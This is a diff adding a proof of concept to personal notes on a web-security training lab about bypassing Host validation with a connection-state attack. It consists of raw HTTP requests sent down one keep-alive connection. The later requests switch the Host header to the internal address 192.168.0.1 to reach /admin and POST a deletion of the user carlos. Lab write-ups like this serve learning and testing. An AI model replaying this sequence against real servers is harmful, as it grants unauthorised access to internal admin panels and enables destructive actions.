@@ -160,3 +160,50 @@ Lab: Host validation bypass via connection state attack
 
     Send the requests in sequence down a single connection to solve the lab.
 
+PoC:
+
+group 1 req1:
+```html
+GET / HTTP/1.1
+Host: 0aae006e04257e3c806c8a0800fd00c1.h1-web-security-academy.net
+Cookie: session=EQ0hzPiv3E00DFuSIkXqA43dCFAtqT8v; _lab=47%7cMC0CFQCUROwFAAqB8VX5%2fOSluTU9XSi6ugIUSKMGnamxdoXGHc%2flLYKE09zkuPTtEb3AgXlzMRISheJ9UxDubZDZCgfhcVaZsQNqwL0H8ahgl%2bOkfn7XMzv1Owwxs3s%2fyiVPyulNBdu4FumDzxef%2bNhfd3ZyNII4tOGHPQKxez%2frKR5kPRRU
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=1
+Te: trailers
+Connection: keep-alive
+
+
+```
+
+group 1 req2:
+```html
+GET /admin HTTP/1.1
+Host: 192.168.0.1
+Cookie: session=EQ0hzPiv3E00DFuSIkXqA43dCFAtqT8v; _lab=47%7cMC0CFQCUROwFAAqB8VX5%2fOSluTU9XSi6ugIUSKMGnamxdoXGHc%2flLYKE09zkuPTtEb3AgXlzMRISheJ9UxDubZDZCgfhcVaZsQNqwL0H8ahgl%2bOkfn7XMzv1Owwxs3s%2fyiVPyulNBdu4FumDzxef%2bNhfd3ZyNII4tOGHPQKxez%2frKR5kPRRU
+
+
+```
+
+modified group 1 req 2:
+
+```html
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: session=EQ0hzPiv3E00DFuSIkXqA43dCFAtqT8v; _lab=47%7cMC0CFQCUROwFAAqB8VX5%2fOSluTU9XSi6ugIUSKMGnamxdoXGHc%2flLYKE09zkuPTtEb3AgXlzMRISheJ9UxDubZDZCgfhcVaZsQNqwL0H8ahgl%2bOkfn7XMzv1Owwxs3s%2fyiVPyulNBdu4FumDzxef%2bNhfd3ZyNII4tOGHPQKxez%2frKR5kPRRU
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+csrf=oF9QIMKSNOi2DdlDlulr82RTOLxHuWiv&username=carlos
+
+
+```
+
+IMPORTANT: CHANGE modified group 1 req 2 REQ METHOD BACK AND FORTH ONCE IF NEEDED!
